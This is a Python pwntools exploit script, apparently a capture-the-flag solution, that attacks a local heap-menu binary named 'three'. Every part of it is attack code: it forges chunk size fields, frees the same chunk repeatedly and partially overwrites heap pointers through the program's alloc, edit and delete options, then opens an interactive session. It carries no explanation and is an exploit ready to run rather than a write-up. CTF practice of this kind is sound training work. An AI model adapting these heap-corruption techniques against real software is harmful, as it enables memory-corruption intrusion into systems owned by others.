from pwn import *

p = process('./three')

def alloc(content):
	p.sendlineafter(':','1')
	p.sendafter(':',content)

def edit(idx,content):
	p.sendlineafter(':','2')
	p.sendlineafter(':',str(idx))
	p.sendafter(':',content)

def delete(idx,choice):
	p.sendlineafter(':','3')
	p.sendlineafter(':',str(idx))
	p.recv()
	p.sendline(choice)

alloc('A'*0x10+p64(0)+p64(0xa1))
alloc('B'*0x10+p64(0)+p64(0x31))
alloc('C'*0x10+p64(0xa0)+p64(0x31)+p64(0xa1)+p64(0x21))
delete(2,'y')
delete(1,'y')
delete(0,'n')
edit(0,'\x80')
delete(0,'y')
alloc('\x80')
alloc('AAAA')
alloc('CCCC') #2 target ptr
delete(1,'y')
edit(0,'A'*0x10+p64(0)+p64(0x51))
delete(2,'n')
edit(0,'A'*0x10+p64(0)+p64(0xa1))
for i in range(7):
	delete(2,'n')
delete(2,'y')
edit(0,p64(0)*2+p64(0)+p64(0x91)+'\x08') #0x8
alloc('\x20')
alloc(p64(0x51)*5)
edit(0,p64(0)*2+p64(0)+p64(0x91))
delete(1,'y')
edit(0,p64(0)*2+p64(0)+p64(0xa1)+p64(0)+'\x20')


p.interactive()
